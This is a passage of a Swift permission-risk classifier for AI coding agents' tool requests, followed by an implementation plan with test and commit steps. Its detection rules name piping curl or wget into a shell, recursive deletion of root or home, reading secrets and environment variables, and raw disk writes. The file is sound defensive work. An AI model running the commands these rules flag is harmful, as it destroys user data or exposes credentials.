    private static let sqlClis: Set<String> = ["psql", "mysql", "mariadb", "sqlite3", "sqlcmd", "mongosh"]
    private static func plain(_ args: [Word]) -> [Word] { args.filter { !$0.text.hasPrefix("-") } }

    // The allow-list: only plain, fully-read forms are low.
    private static let plainCmds: [String: (rule: String, reason: String)] = {
        var m: [String: (String, String)] = ["pwd": ("none", "read_only"), "ls": ("any", "read_only"), "echo": ("text", "local_command"), "printf": ("text", "local_command")]
        for c in ["cat", "head", "tail", "wc", "file", "stat", "du", "df"] { m[c] = ("file", "read_only") }
        m["grep"] = ("none", "read_only")
        return m
    }()
    private static let plainGit: [String: String] = ["status": "file", "diff": "file", "log": "file", "show": "file", "rev-parse": "file", "branch": "none"]
    private static let plainTests = ["npm test", "npm run test", "npm run build", "npm run lint", "make test", "make build", "cargo test", "cargo build", "go test", "go build", "swift build", "swift test", "pytest"]
    private static let safeShort = "^-[AaBbdEFGHhIiJjkLlmNnqRrSsTvwXx0-9]+\\z"
    private static let safeLong = "^--(stat|shortstat|numstat|name-only|name-status|oneline|graph|decorate|cached|staged|short|porcelain|branch|no-color|color|all|almost-all|human-readable|show-current|list|abbrev-ref|show-toplevel|verify|summary|workspace|release|all-targets|lib|bins|tests|no-fail-fast|nocapture|quiet|verbose|locked|frozen|offline|silent|if-present)\\z"

    /// The basename of a secrets file that `w` names (`rev:path` counts its path), or nil.
    private static func secretName(_ w: String, _ cwd: String, _ home: String) -> String? {
        let tail = w.lastIndex(of: ":").map { String(w[w.index(after: $0)...]) } ?? w
        for x in [tail, w] {
            let r = resolvePath(x, cwd, home)
            if !x.isEmpty && sensitivePath(r) { return baseName(r) }
        }
        return nil
    }

    /// The values of a flag: `-o FILE`, `-oFILE`, `-ro FILE` (a clustered flag takes the next word), `--output FILE`, `--output=FILE`.
    private static func flagValues(_ rest: [Word], _ short: String, _ long: String) -> [String] {
        var v: [String] = []
        for (i, a) in rest.enumerated() {
            let t = a.text
            if !t.hasPrefix("-") { continue }
            if t.hasPrefix("--") {
                if t == long { if i + 1 < rest.count { v.append(rest[i + 1].text) } } else if t.hasPrefix(long + "=") { v.append(String(t.dropFirst(long.count + 1))) }
                continue
            }
            let u = Array(t.unicodeScalars), sh = short.unicodeScalars.first!
            guard u.count > 1, let k = u[1...].firstIndex(of: sh) else { continue }
            var x = ""
            if k + 1 < u.count { var sv = String.UnicodeScalarView(); sv.append(contentsOf: u[(k + 1)...]); x = String(sv) } else if i + 1 < rest.count { x = rest[i + 1].text }
            if !x.isEmpty { v.append(x) }
        }
        return v
    }

    /// The plain words of a command that name files: the pattern or program of grep, sed, awk and jq is not one, unless -e, --expression, --regexp or -f / --file gives it.
    private static func fileWords(_ name: String, _ rest: [Word]) -> [String] {
        var pl = plain(rest).map(\.text)
        if !progFirst.contains(name) { return pl }
        let given = flagValues(rest, "e", "--expression") + flagValues(rest, "e", "--regexp")
        for g in given { if let k = pl.firstIndex(of: g) { pl.remove(at: k) } }
        return !given.isEmpty || !flagValues(rest, "f", "--file").isEmpty ? pl : Array(pl.dropFirst())
    }

    private struct Wrap { var val: [String]; var bool: [String] }
    private static let wrap: [String: Wrap] = [
        "timeout": Wrap(val: ["-s", "-k", "--signal", "--kill-after"], bool: ["-v", "--foreground", "--preserve-status", "--verbose"]),
        "nice": Wrap(val: ["-n", "--adjustment"], bool: []),
        "ionice": Wrap(val: ["-c", "-n", "-p", "-P", "-u", "--class", "--classdata", "--pid", "--pgid", "--uid"], bool: ["-t", "--ignore"]),
        "stdbuf": Wrap(val: ["-i", "-o", "-e", "--input", "--output", "--error"], bool: []),
        "xargs": Wrap(val: ["-I", "-n", "-P", "-L", "-s", "-d", "-E", "-a", "-R", "-S", "--max-args", "--max-procs", "--max-lines", "--max-chars", "--delimiter", "--arg-file"],
                      bool: ["-0", "-r", "-t", "-p", "-x", "-o", "--null", "--no-run-if-empty", "--verbose", "--interactive", "--exit", "--open-tty"]),
    ]

    /// Takes the options of a wrapper off the front of `a`. An option outside the wrapper's lists leaves the command word unknown: everything before the first `sudo`, `doas` or `rm` is dropped, and with none of them nothing is left.
    private static func skipWrapper(_ a: inout [Word], _ w: Wrap) {
        while true {
            guard let first = a.first, Rx.test("^-.", first.text) else { return }
            let f = first.text
            a.removeFirst()
            if f == "--" { return }
            if w.val.contains(f) { if !a.isEmpty { a.removeFirst() } }
            else if f.contains("=") || w.bool.contains(f) || Rx.test("^-\\d+\\z", f) || (!f.hasPrefix("--") && f.utf16.count > 2 && w.val.contains(String(f.prefix(2)))) { continue }
            else {
                let k = a.firstIndex { Rx.test("^(sudo|doas|rm)\\z", baseName($0.text)) }
                a.removeFirst(k ?? a.count)
                return
            }
        }
    }

    /// Looks through the words that only prefix a command: `VAR=1`, `env`, `time`, `command`, `nohup`, `sudo` and `doas` (which is remembered).
    private static func skipPrefix(_ args: [Word]) -> (sudo: Bool, args: [Word]) {
        var a = args, sudo = false
        while let w = a.first {
            let t = w.text, b = baseName(t)
            if t.isEmpty { break }
            if Rx.test("^[A-Za-z_][A-Za-z0-9_]*=", t) && !w.quoted { a.removeFirst(); continue }
            if b == "sudo" || b == "doas" {
                sudo = true; a.removeFirst()
                while let n = a.first, n.text.hasPrefix("-") { let f = a.removeFirst().text; if Rx.test("^-[ugCpD]\\z", f), !a.isEmpty { a.removeFirst() } }
                continue
            }
            if b == "env" {
                a.removeFirst()
                while let n = a.first, n.text.hasPrefix("-") || Rx.test("^[A-Za-z_][A-Za-z0-9_]*=", n.text) { a.removeFirst() }
                continue
            }
            if ["time", "command", "nohup", "builtin", "exec"].contains(b) { a.removeFirst(); continue }
            if let wr = wrap[b], b != "xargs" {
                a.removeFirst()
                skipWrapper(&a, wr)
                if b == "timeout", let n = a.first, Rx.test("^[0-9.]+[smhd]?\\z", n.text) { a.removeFirst() }
                continue
            }
            break
        }
        return (sudo, a)
    }

    /// The reason id (low) when one part of a command is on the allow-list, else nil. The command word is read as typed: `/tmp/x/ls` and `FOO=1 ls` are not `ls`.
    private static func plainReason(_ part: Part, _ cwd: String, _ home: String) -> String? {
        if part.redirs.contains(where: { $0.dup || $0.rw || $0.target != "/dev/null" }) { return nil }
        guard let c = part.args.first else { return nil }
        let words = Array(part.args.dropFirst())
        var rule: String? = nil, reason = "read_only", args = words
        if let p = plainCmds[c.text] { rule = p.rule; reason = p.reason }
        else if c.text == "git", let w0 = words.first, !w0.quoted, let r = plainGit[w0.text] { rule = r; args = Array(words.dropFirst()) }
        else {
            let line = ([c] + words).map(\.text).joined(separator: " ") + " "
            if let p = plainTests.first(where: { line.hasPrefix($0 + " ") }) {
                rule = "file"; reason = "test_build"; args = Array(words.dropFirst(p.split(separator: " ").count - 1))
                if c.text == "make", !args.isEmpty { return nil }
            }
        }
        guard let rule else { return nil }
        var ops: [String] = [], flags = ""
        for a in args {
            if !a.text.hasPrefix("-") { ops.append(a.text); continue }
            if a.text == "--" { continue }
            if !Rx.test(rule == "text" ? "^-[neE]+\\z" : safeShort, a.text) && !Rx.test(safeLong, a.text) { return nil }
            flags += a.text
        }
        if progFirst.contains(c.text), !ops.isEmpty { ops.removeFirst() }
        if c.text == "grep", Rx.test("-[A-Za-z]*[rRd]", flags) { return nil }
        func isFile(_ o: String) -> Bool {
            !Rx.test("[$*?\\[{=]", o) && !o.hasSuffix("/") && whereIs(o, cwd, home) == "inside" && lc(resolvePath(o, cwd, home)) != lc(resolvePath(cwd.isEmpty ? "." : cwd, "", home)) && secretName(o, cwd, home) == nil
        }
        let ok: Bool
        switch rule {
        case "none": ok = ops.isEmpty
        case "file": ok = ops.allSatisfy(isFile)
        case "any": ok = !(Rx.test("R", flags) && ops.contains { secretName($0, cwd, home) != nil })
        default: ok = true
        }
        return ok ? reason : nil
    }

    /// The candidates of one command line; never empty. High patterns are found in every part and wherever the text hides them, then the allow-list gives low, and any part neither knows is `unsure`.
    private static func shellCandidates(_ cmd: String, _ cwd: String, _ home: String, _ depth: Int, _ ps: Bool) -> [Cand] {
        var found: [Cand] = []
        func add(_ reason: String, _ target: String = "") { found.append(Cand(reason: reason, target: target)) }
        func writeTo(_ p: String) { let c = writeCandidate(p, cwd, home); if writeFlags.contains(c.reason) { found.append(c) } }
        func name(_ p: String) -> String { baseName(resolvePath(p, cwd, home)) }
        func outsideOf(_ paths: [String]) -> String? { paths.first { whereIs($0, cwd, home) != "inside" } }
        func command(_ args: [Word], _ part: Part, _ piped: Bool) {
            let cmdName = baseName(args[0].text), rest = Array(args.dropFirst()), pl = plain(rest).map(\.text)
            let interpreters = "^(python[0-9.]*|node|deno|bun|ruby|perl|php|lua|Rscript|(pwsh|powershell)(\\.exe)?)\\z"
            if piped && (shells.contains(cmdName) || (Rx.test(interpreters, cmdName) && !(rest.first?.text == "-m" && rest.count > 1))) { add("pipe_to_shell") }
            if (shells.contains(cmdName) || cmdName == "source" || cmdName == ".") && Rx.test("\(Rx.wordStart)(curl|wget)\(Rx.wordEnd)", cmd) && rest.contains(where: { $0.text == "<(" || Rx.test("\\$\\(|`", $0.text) }) { add("pipe_to_shell") }
            if shells.contains(cmdName) {
                let ci = rest.firstIndex { Rx.test("^-[A-Za-z]*c\\z", $0.text) }
                add("unsure")
                if let ci, ci + 1 < rest.count, depth < 2 { found.append(contentsOf: shellCandidates(rest[ci + 1].text, cwd, home, depth + 1, ps)) }
                return
            }
            if cmdName == "eval" {
                add("unsure")
                if depth < 2 { found.append(contentsOf: shellCandidates(rest.map(\.text).joined(separator: " "), cwd, home, depth + 1, ps)) }
                return
            }
            if cmdName == "xargs" {
                var x = rest
                skipWrapper(&x, wrap["xargs"]!)
                let inner = skipPrefix(x)
                add("unsure")
                if inner.sudo { add("sudo") }
                if !inner.args.isEmpty { command(inner.args, part, true) }
                return
            }
            if cmdName == "rm" || cmdName.lowercased() == "remove-item" {
                if pl.contains(where: { Rx.test("(^|/)\\.git(/|\\z)", resolvePath($0, cwd, home), .caseInsensitive) }) { add("git_history"); return }
                let rec = rest.contains { Rx.test("^-[A-Za-z]*[rR][A-Za-z]*\\z", $0.text) || $0.text == "--recursive" || Rx.test("^-recurse\\z", $0.text, .caseInsensitive) }
                func all(_ t: String) -> Bool { Rx.test("[*?\\[{]", t) }
                let bad = pl.first { t in
                    let r = resolvePath(t, cwd, home)
                    return all(t) || t == "{}" || r == "/" || Rx.test("^[A-Za-z]:/\\z", r) || isHomeFolder(r, home) || r.contains("$") || whereIs(t, cwd, home) != "inside" || (!cwd.isEmpty && lc(r) == lc(resolvePath(cwd, "", home)))
                }
                let sec = pl.compactMap { secretName($0, cwd, home) }.first
                if rec && pl.isEmpty { add("rm_recursive") }
                else if rec, let bad {
                    let rb = resolvePath(bad, cwd, home)
                    add("rm_recursive", isHomeFolder(rb, home) ? "~" : Rx.test("^([A-Za-z]:)?/\\z", rb) ? rb : name(all(bad) && whereIs(bad, cwd, home) == "inside" ? "." : bad))
                }
                else if let sec { add("sensitive_file", sec) }
                else if !rec, let o = outsideOf(pl) { add("outside_project", name(o)) }
                else { add("rm_in_project", pl.isEmpty ? "" : name(pl[0])) }
                return
            }
            if cmdName == "chmod" || cmdName == "chown" || cmdName == "chgrp" {
                let paths = Array(pl.dropFirst())
                if rest.contains(where: { Rx.test("^-[A-Za-z]*R[A-Za-z]*\\z", $0.text) || $0.text == "--recursive" }) {
                    let n = name(paths.last ?? ".")
                    add("chmod_recursive", n.isEmpty ? "/" : n)
                }
                else if let o = outsideOf(paths) { add("outside_project", name(o)) }
                return
            }
            if cmdName == "dd" || cmdName.hasPrefix("mkfs") || cmdName == "fdisk" || (cmdName == "diskutil" && Rx.test("^(erase|partition|zero|secure)", pl.first ?? "", .caseInsensitive)) { add("disk_write"); return }
            if cmdName == "git" {
                var g = rest
                while let f0 = g.first, f0.text.hasPrefix("-") {
                    let f = g.removeFirst().text
                    if f == "-c" || f == "--config-env", !g.isEmpty {
                        let key = g.removeFirst().text.components(separatedBy: "=")[0]
                        if Rx.test(execKey, key, .caseInsensitive) { add("sensitive_file", "config") }
                    }
                    else if f.hasPrefix("--config-env=") { if Rx.test(execKey, String(f.dropFirst(13)).components(separatedBy: "=")[0], .caseInsensitive) { add("sensitive_file", "config") } }
                    else if f == "-C" { if !g.isEmpty { g.removeFirst() } }
                }
                let sub = g.first?.text ?? "", fl = g.dropFirst().map(\.text), vals = fl.filter { !$0.hasPrefix("-") }
                if sub == "config" {
                    if vals.count > 1 && vals.contains(where: { Rx.test(execKey, $0, .caseInsensitive) }) && !fl.contains(where: { $0.hasPrefix("--get") }) { add("sensitive_file", "config") }
                    else if fl.contains("--list") || fl.contains("-l") { add("reads_secrets", "config") }
                } else if sub == "push" {
                    add(fl.contains(where: { Rx.test("^--force(-with-lease|-if-includes)?(=|\\z)", $0) || Rx.test("^-[A-Za-z]*f[A-Za-z]*\\z", $0) || $0.hasPrefix("+") }) ? "git_force_push" : "git_push")
                }
                else if sub == "reset" { if fl.contains("--hard") { add("git_reset_hard") } }
                else if sub == "clean" { if fl.contains(where: { $0 == "--force" || Rx.test("^-[A-Za-z]*f", $0) }) { add("git_clean") } }
                else if gitNet.contains(sub) { add("network_fetch") }
                if gitReads.contains(sub), let n = vals.compactMap({ secretName($0, cwd, home) }).first { add("reads_secrets", n) }
                return
            }
            if let o = outFlag[cmdName] { flagValues(rest, o.0, o.1).forEach(writeTo) }
            if netCmds.contains(cmdName) { add("network_fetch"); return }
            if containerCmds.contains(cmdName) { add("container"); return }
            if sqlClis.contains(cmdName) {
                for st in cmd.components(separatedBy: ";") {
                    if Rx.test("\(Rx.wordStart)DROP\\s+(TABLE|DATABASE|SCHEMA|INDEX|VIEW)\(Rx.wordEnd)", st, .caseInsensitive) || Rx.test("\\.(drop|dropDatabase)\\s*\\(", st) { add("sql_drop"); return }
                    let hasWrite = Rx.test("\(Rx.wordStart)DELETE\\s+FROM\(Rx.wordEnd)", st, .caseInsensitive) || Rx.test("\(Rx.wordStart)UPDATE[^;]*?\(Rx.wordStart)SET\(Rx.wordEnd)", st, .caseInsensitive) || Rx.test("\(Rx.wordStart)TRUNCATE\(Rx.wordEnd)", st, .caseInsensitive)
                    if (hasWrite && !Rx.test("\(Rx.wordStart)WHERE\(Rx.wordEnd)", st, .caseInsensitive)) || Rx.test("deleteMany\\(\\s*\\{\\s*\\}\\s*\\)", st) { add("sql_delete_all"); return }
                }
                return
            }
            if ["npm", "pnpm", "yarn", "bun"].contains(cmdName) { if installSubs.contains(pl.first ?? "") { add("install") }; return }
            if ["pip", "pip3", "pipx", "uv", "brew", "gem", "apt", "apt-get", "composer", "poetry", "conda", "port"].contains(cmdName) { if pl.contains(where: { installSubs.contains($0) }) { add("install") }; return }
            if cmdName == "cargo" || cmdName == "go" { if ["install", "add", "get"].contains(pl.first ?? "") { add("install") }; return }
            if writeCmds.contains(cmdName) {
                let tv = flagValues(rest, "t", "--target-directory")
                if ["touch", "mkdir", "tee"].contains(cmdName) || (cmdName == "install" && rest.contains { $0.text == "-d" }) { pl.forEach(writeTo) }
                else if !tv.isEmpty { tv.forEach(writeTo) }
                else {
                    if let last = pl.last { writeTo(last) }
                    for s in pl.dropLast() where whereIs(s, cwd, home) != "inside" { add("outside_project", name(s)) }
                }
                return
            }
            if cmdName == "sed" && rest.contains(where: { Rx.test("^(-[A-Za-z]*i|--in-place)", $0.text) }) { fileWords("sed", rest).forEach(writeTo) }
            if readers.contains(cmdName) {
                let words = fileWords(cmdName, rest) + part.redirs.filter { !$0.out }.map(\.target)
                if let n = words.compactMap({ secretName($0, cwd, home) }).first { add("reads_secrets", n) }
            }
        }

        let (parts, opaque) = splitShell(cmd, ps)
        var lists = [parts]
        if opaque {
            add("unsure")
            lists.append(splitShell(cmd.replacingOccurrences(of: "[\"'`]", with: " ", options: .regularExpression), ps).parts)
        }
        for list in lists {
            for (idx, part) in list.enumerated() {
                if let low = plainReason(part, cwd, home) { add(low); continue }
                let start = found.count, raw = part.args
                if raw.count == 1, ["env", "printenv"].contains(baseName(raw[0].text)) { add("reads_secrets", "environment"); continue }
                let (sudo, args) = skipPrefix(raw)
                if sudo { add("sudo") }
                for r in part.redirs {
                    if !r.out || r.dup || Rx.test("^/dev/(null|stdout|stderr|tty|zero)\\z", r.target) { continue }
                    if r.target.hasPrefix("/dev/") { add("disk_write") } else { writeTo(r.target) }
                }
                if !args.isEmpty { command(args, part, idx > 0 && list[idx - 1].op == "|") }
                if found.count == start { add("unsure") }
            }
        }
        if found.isEmpty { add("unsure") }
        return found
    }

    // MARK: Tools

    private static let shellTools: Set<String> = ["Bash", "PowerShell", "run_shell_command", "shell", "local_shell", "exec_command"]
    private static let readTools: Set<String> = ["Read", "Glob", "Grep", "LS", "NotebookRead", "read_file", "read_many_files", "list_directory", "search_file_content", "grep_search", "glob", "grep_files"]
    private static let toolArgs: [String: Set<String>] = {
        let t: [String: String] = [
            "Read": "file_path offset limit pages", "Glob": "pattern path", "Grep": "pattern path output_mode -i -n -A -B -C context multiline head_limit offset include", "LS": "path ignore", "NotebookRead": "notebook_path cell_id",
            "Write": "file_path content", "Edit": "file_path old_string new_string replace_all", "MultiEdit": "file_path edits", "NotebookEdit": "notebook_path new_source cell_id cell_type edit_mode",
            "read_file": "file_path absolute_path path offset limit", "read_many_files": "paths include exclude recursive useDefaultExcludes respect_git_ignore respect_gemini_ignore",
            "list_directory": "dir_path path ignore file_filtering_options respect_git_ignore respect_gemini_ignore", "search_file_content": "pattern dir_path path include", "grep_search": "pattern dir_path path include",
            "glob": "pattern dir_path path case_sensitive respect_git_ignore respect_gemini_ignore", "grep_files": "pattern include path limit",
            "write_file": "file_path content", "replace": "file_path old_string new_string instruction expected_replacements", "edit_file": "file_path old_string new_string", "apply_patch": "command",
            "WebFetch": "url prompt", "WebSearch": "query allowed_domains blocked_domains", "web_fetch": "url prompt", "google_web_search": "query", "web_search": "query",
            "Task": "description prompt subagent_type model run_in_background resume", "Agent": "description prompt subagent_type model run_in_background resume",
            "TodoWrite": "todos", "write_todos": "todos", "ExitPlanMode": "plan", "AskUserQuestion": "questions", "Skill": "skill args",
        ]
        return t.mapValues { Set($0.split(separator: " ").map(String.init)) }
    }()
    private static let searchTools: Set<String> = ["Grep", "search_file_content", "grep_search", "grep_files"]
    private static let contentTools: Set<String> = ["Read", "Grep", "NotebookRead", "read_file", "read_many_files", "search_file_content", "grep_search", "grep_files"]
    private static let webTools: Set<String> = ["WebFetch", "WebSearch", "web_fetch", "google_web_search", "web_search"]
    static let writeTools: Set<String> = ["Write", "Edit", "MultiEdit", "NotebookEdit", "write_file", "replace", "edit_file"]
    private static let quietTools: Set<String> = ["TodoWrite", "ExitPlanMode", "AskUserQuestion", "write_todos", "Skill"]

    /// The command of a shell tool's input: a string, or a list like `["bash","-lc","ls"]` (Codex).
    private static func commandOf(_ input: [String: Any]) -> String? {
        if let c = input["command"] as? String { return c }
        guard let a = input["command"] as? [Any] else { return nil }
        let strs = a.compactMap { $0 as? String }
        guard strs.count == a.count else { return nil }
        if strs.count >= 3, shells.contains(baseName(strs[0])), Rx.test("^-[A-Za-z]*c\\z", strs[1]) { return strs[2] }
        return strs.joined(separator: " ")
    }

    /// The files a tool writes, from its input: `file_path`, `path`, `notebook_path`, or the `*** Update File:` lines of a Codex patch.
    static func pathsOf(_ tool: String, _ input: [String: Any]) -> [String] {
        if tool == "apply_patch" {
            let t = (input["command"] as? String) ?? (input["patch"] as? String) ?? ""
            return Rx.all("^\\*\\*\\* (?:Add|Update|Delete) File: (.+)$|^\\*\\*\\* Move to: (.+)$", t, .anchorsMatchLines).map { ($0[1] ?? $0[2] ?? "").trimmingCharacters(in: .whitespacesAndNewlines) }
        }
        for k in ["file_path", "absolute_path", "path", "notebook_path", "target_file"] { if let p = input[k] as? String { return [p] } }
        return []
    }

    private static func asList(_ v: Any?) -> [String] {
        if let s = v as? String { return [s] }
        if let a = v as? [Any] { return a.compactMap { $0 as? String } }
        return []
    }

    private static func finish(_ reason: String, _ target: String) -> SKExplanation {
        var name = target == "~" || Rx.test("^([A-Za-z]:)?/\\z", target) ? target : (target.isEmpty ? "" : baseName(target))
        if Rx.test("\\s|[;|<>()]|(?<!\\$)&", name) { name = "a file" }
        let r = reasonById[reason]!
        let has = r.line.contains("{name}")
        return SKExplanation(risk: r.risk, reasonId: r.id, line: r.line.replacingOccurrences(of: "{name}", with: name.isEmpty ? "a file" : name), target: has ? name : "")
    }

    /// Says in plain words how risky one permission request is. Labels only. `agent` is reserved (every agent is read the same way today). `tool`, `input`, `cwd` and `home` are
    /// whatever the hook gave (a tool that is not text is no tool, an input that is not an object is no input). Returns the reason, its risk, a fixed line with a basename in it, and that basename.
    static func explain(agent: String? = nil, tool: Any?, input: Any?, cwd: Any?, home: Any?) -> SKExplanation {
        let t = tool as? String ?? "", inp = input as? [String: Any] ?? [:], dir = cwd as? String ?? "", h = home as? String ?? ""
        var cands: [Cand]? = nil
        if shellTools.contains(t) {
            if let c = commandOf(inp) { cands = c.utf16.count > 20000 ? [Cand(reason: "unsure")] : shellCandidates(c, dir, h, 0, t == "PowerShell") }
        } else if t == "apply_patch" || writeTools.contains(t) {
            let ps = pathsOf(t, inp)
            cands = ps.isEmpty ? nil : ps.map { writeCandidate($0, dir, h) }
        } else if readTools.contains(t) {
            let named = ["file_path", "absolute_path", "path", "dir_path", "paths", "notebook_path", "target_file"].flatMap { asList(inp[$0]) }
            let sec = contentTools.contains(t) ? (named + asList(inp["include"])).first { sensitivePath(resolvePath($0, dir, h)) } : nil
            let dirs = asList(inp["path"]) + asList(inp["dir_path"]) + asList(inp["paths"])
            func notFile(_ p: String) -> Bool {
                p.hasSuffix("/") || !Rx.test("\\.(ts|tsx|js|jsx|mjs|json|md|txt|py|swift|rs|go|css|html|yml|yaml|toml)\\z", baseName(p), .caseInsensitive) || lc(resolvePath(p, dir, h)) == lc(resolvePath(dir.isEmpty ? "." : dir, "", h))
            }
            let wide = (searchTools.contains(t) && (dirs.isEmpty || dirs.contains(where: notFile))) || (t == "read_many_files" && asList(inp["paths"]).contains(where: notFile))
            let off = (asList(inp["paths"]) + asList(inp["include"])).contains { Rx.test("[*?\\[{]", $0) } || named.contains { whereIs($0, dir, h) != "inside" || sensitivePath(resolvePath($0, dir, h)) || (dir.isEmpty && $0 == ".") }
            let noPath = ["Read", "NotebookRead", "LS", "read_file", "read_many_files", "list_directory"].contains(t) && !named.contains { !$0.isEmpty }
            if noPath { cands = [Cand(reason: "unsure")] }
            else if let sec { cands = [Cand(reason: "reads_secrets", target: baseName(resolvePath(sec, dir, h)))] }
            else if wide || off { cands = [Cand(reason: "unsure")] }
            else { cands = [Cand(reason: "read_only")] }
        } else if webTools.contains(t) { cands = [Cand(reason: "web")] }
        else if t == "Task" || t == "Agent" { cands = [Cand(reason: "subagent")] }
        else if quietTools.contains(t) { cands = [Cand(reason: "local_command")] }
        else if t.hasPrefix("mcp__") { cands = [Cand(reason: "mcp_tool")] }
        else if !t.isEmpty { cands = [Cand(reason: "unknown_tool")] }
        if cands != nil, !shellTools.contains(t), let allowed = toolArgs[t], !inp.keys.allSatisfy({ allowed.contains($0) }) { cands!.append(Cand(reason: "unsure")) }
        guard let list = cands, !list.isEmpty else { return finish("unsure", "") }
        func rank(_ c: Cand) -> Int { let r = reasonById[c.reason]!; return riskRank[r.risk]! * 100 - r.order }
        var best = list[0]
        for c in list.dropFirst() where rank(c) > rank(best) { best = c }
        return finish(best.reason, best.target)
    }
}
```

- [ ] **Step 5: Run the test to make it pass**

Run: `bash scripts/test-sidekick-explain.sh`
Expected: PASS. 11 `✓` lines under four headings (`the frozen reasons: 30 ids …`, `explain: 554 cases …`, `what the fixture cannot write`, `a fuzz of hostile text …`), then `All tests passed.`

Bite it once (the check is that the program fails when a rule is wrong, not only when a file is missing): `sed -i '' 's/("sudo", "high", /("sudo", "medium", /' NotchBuddy/Sources/App/SidekickExplain.swift && bash scripts/test-sidekick-explain.sh 2>&1 | grep -E "✗|failed"`. Expected: `✗ the table is the contract's`, `✗ every case gives the fixture's answer (` followed by a number of differences, and `2 test(s) failed.` Undo it with `sed -i '' 's/("sudo", "medium", /("sudo", "high", /' NotchBuddy/Sources/App/SidekickExplain.swift` and run the test again: `All tests passed.`

- [ ] **Step 6: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): the risk rules, from explain-cases.json

SidekickExplain labels a permission request with a risk and one fixed line that holds a basename and nothing else; SidekickText holds the regular-expression kit, the basename and the command key's hash.

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickText.swift NotchBuddy/Sources/App/SidekickExplain.swift tests/SidekickExplainTests.swift scripts/test-sidekick-explain.sh
git commit -F "$MSG"
```

---

### Task 2: The hook adapter and the ledger

**Agent:** `nm-implementer-light` (Haiku 5.5, medium).

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickLedger.swift`, `tests/SidekickLedgerTests.swift`, `scripts/test-sidekick-ledger.sh`

**Interfaces:**
- Consumes: Task 1's `SK.baseName`, `SK.commandKey`, `SK.minute`, `Rx`, `SidekickExplain.pathsOf`; F1-0's `eventFrom` and `ledgerApply` and `tests/fixtures/sidekick/hook-cases.json` (keys `cases` with `source`, `now`, `payload`, `opts`, `event`; `sequences` with `steps` that are `{at, payload}` or `{at, answered}`, and `ledger`).
- Produces: `SKEvent` (`at`, `agentId`, `sessionId`, `kind`, `name`, `tool`, `target`, `file`, `key`, `ok`, `project`, `subagentId`, `json`), `SKRing`, `SKSession` (`aliveSubagents`, `isDone`, `json`, `init(json:)`, `init(key:agentId:sessionId:startedAt:lastEventAt:)`), `SKLedger` (`sessions`, `json`, `init(json:)`) and `SidekickLedger` (`ringMax`, `sessionsMax`, `eventFrom(_:now:codex:)`, `approvalAnswered(agentId:sessionId:now:)`, `prune(_:now:)`, `apply(_:_:)`, `live(_:)`, `capId(_:)`, `toolState(_:)`). Tasks 3, 4, 9 and 10 read them.

The ledger is the sidekick's only memory: one small record per session, keyed `agentId|sessionId`, in memory, never written to disk and never logged. It holds a basename, a command key (a hash) and counts, and nothing else: no prompt, no assistant text, no `transcript_path`, no command, no full path, no file content. A hook payload without a `session_id` or `conversation_id` is filed under `unknown`; a session id of a million characters is kept to its first 128 code points.

- [ ] **Step 1: Write the failing test**

The program pins the command key's hashes (FNV-1a of canonical JSON: `''` is `811c9dc5`, `Bash` with `ls -la` is `Bash#d3abe9d5`), replays the 52 payloads and 19 sequences of the fixture, and adds what it cannot write (a time that is not finite, a ledger that the call must not change, a 5000-deep input that gets the fixed key `Bash#too-deep` instead of a stack overflow, a payload that is not an object) and a leak check: seven marker strings (a prompt, a tool's output, an assistant message, a file's content, a parent folder of `cwd`, a command, a transcript path) go in, and none comes out of the ledger's JSON.

**Create `tests/SidekickLedgerTests.swift`**

```swift
import Foundation

// The hook adapter and the ledger against tests/fixtures/sidekick/hook-cases.json (every payload gives the event it records, every sequence the ledger it records), the command key's
// pinned values, and what the fixture cannot write: a time that is not finite, a ledger that is never changed by the call, and a marker planted in every input that must never come out.
// Run through scripts/test-sidekick-ledger.sh.

@main
enum SidekickLedgerTests {
    typealias L = SidekickLedger
    static func rows(_ x: Any?) -> [[String: Any]] { x as! [[String: Any]] }
    static func number(_ v: Any?) -> Double? { guard let n = v as? NSNumber, CFGetTypeID(n) != CFBooleanGetTypeID() else { return nil }; return n.doubleValue }

    @MainActor static func main() {
        let fx = CT.fixture("hook-cases.json", dir: "sidekick")

        CT.section("the command key: FNV-1a over canonical JSON, pinned")
        CT.check("fnv1a of nothing", SK.fnv1a(""), "811c9dc5")
        CT.check("fnv1a of a", SK.fnv1a("a"), "e40c292c")
        CT.check("a command", SK.commandKey(tool: "Bash", input: ["command": "ls -la"]), "Bash#d3abe9d5")
        CT.check("extra spaces in a command do not make another step", SK.commandKey(tool: "Bash", input: ["command": "  ls   -la "]), "Bash#d3abe9d5")
        CT.check("no input at all", SK.commandKey(tool: "X", input: nil), "X#77074ba4")
        CT.check("lists, text with an accent, null and a boolean", SK.commandKey(tool: "X", input: ["x": [1, "é", NSNull(), true] as [Any], "file_path": "/a"] as [String: Any]), "X#63e27ca3")
        CT.check("key order does not matter", SK.commandKey(tool: "X", input: ["a": 1, "b": 2]), SK.commandKey(tool: "X", input: ["b": 2, "a": 1]))
        CT.checkTrue("the tool is part of the key", SK.commandKey(tool: "Bash", input: ["command": "ls"]) != SK.commandKey(tool: "Read", input: ["command": "ls"]))

        let cases = rows(fx["cases"])
        CT.section("eventFrom: \(cases.count) payloads, the event each one records")
        var diffs: [String] = []
        for c in cases {
            let name = c["name"] as! String
            let opts = c["opts"] as? [String: Any]
            let got: Any
            if let now = number(c["now"]) { got = L.eventFrom(c["payload"], now: now, codex: opts?["codex"] as? Bool ?? true)?.json ?? NSNull() } else { got = NSNull() }
            let d = CT.diffs(got, c["event"] ?? NSNull())
            if !d.isEmpty { diffs.append("\(name): \(d.first!)") }
        }
        CT.checkRows("every payload gives its event", diffs)

        let seqs = rows(fx["sequences"])
        CT.section("ledgerApply: \(seqs.count) sequences, the ledger each one ends with")
        diffs = []
        for s in seqs {
            var ledger = SKLedger()
            for st in rows(s["steps"]) {
                let at = number(st["at"])!
                if let a = st["answered"] as? [String: Any] { ledger = L.apply(ledger, L.approvalAnswered(agentId: a["agentId"] as! String, sessionId: a["sessionId"] as! String, now: at)) }
                else if let ev = L.eventFrom(st["payload"], now: at, codex: (st["opts"] as? [String: Any])?["codex"] as? Bool ?? true) { ledger = L.apply(ledger, ev) }
            }
            let d = CT.diffs(ledger.json, s["ledger"]!)
